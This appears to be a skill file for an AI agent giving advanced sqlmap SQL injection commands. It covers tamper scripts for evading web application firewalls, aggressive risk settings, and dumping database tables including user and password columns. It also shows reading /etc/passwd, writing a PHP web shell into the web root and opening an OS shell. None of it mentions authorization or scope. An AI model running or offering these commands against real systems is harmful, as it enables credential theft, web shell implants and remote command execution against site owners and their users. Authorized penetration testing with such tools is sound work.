---
name: sqlmap-advanced
description: "Advanced sqlmap usage: tamper scripts, request files, os-shell, and tuning for WAF-protected targets. Use this skill when basic sqlmap runs are blocked or too noisy."
---

# sqlmap Advanced

## Overview

sqlmap beyond the basics: control the requests, evade filters, and reach file/OS access.

## Request file

```bash
# save a Burp request to req.txt
sqlmap -r req.txt -p id --batch
sqlmap -r req.txt --dbms=mysql --technique=U
```

## Tamper scripts

```bash
sqlmap -u "https://t/?id=1" --tamper=space2comment,between,randomcase
```

| Tamper | Effect |
|---|---|
| `space2comment` | replaces space with `/**/` |
| `randomcase` | randomizes keyword case |
| `between` | `>` becomes `BETWEEN` |
| `charencode` | URL-encodes |
| `base64encode` | wraps in base64 (needs a decoder) |
| `apostrophemask` | `'` becomes `%EF%BC%87` |
| `modsecurityversioned` | wraps in versioned comments |

Chain several: `--tamper=space2comment,randomcase,charencode`.

## Technique control

```bash
--technique=BEUSTQ
# B boolean, E error, U union, S stacked, T time, Q inline
```

## Tuning

```bash
--threads 10 --time-sec 2 --delay 0.5 --random-agent
--level 5 --risk 3 --os-shell
```

## Enumeration

```bash
sqlmap -u URL --dbs
sqlmap -u URL -D app --tables
sqlmap -u URL -D app -T users --columns
sqlmap -u URL -D app -T users -C user,pass --dump
sqlmap -u URL --dump-all --exclude-sysdbs
```

## File and OS access

```bash
sqlmap -u URL --file-read=/etc/passwd
sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/shell.php
sqlmap -u URL --os-shell
sqlmap -u URL --os-cmd="id"
```

These require the DBMS to have file/exec privileges.

## Custom injection point

```bash
sqlmap -u "https://t/api" --data='{"id":"1"}' --headers="Content-Type: application/json" -p id
```

JSON injection needs `--prefix`/`--suffix` or a custom tamper if the value is quoted inside JSON.

## Pitfalls

- `--os-shell` on MSSQL requires `xp_cmdshell` enabled.
- `--dump-all` on a large DB can take hours and fill disk.
- Aggressive tampering breaks legitimate requests and raises alerts.

## Verification

Dumped rows must match values visible in the application UI.
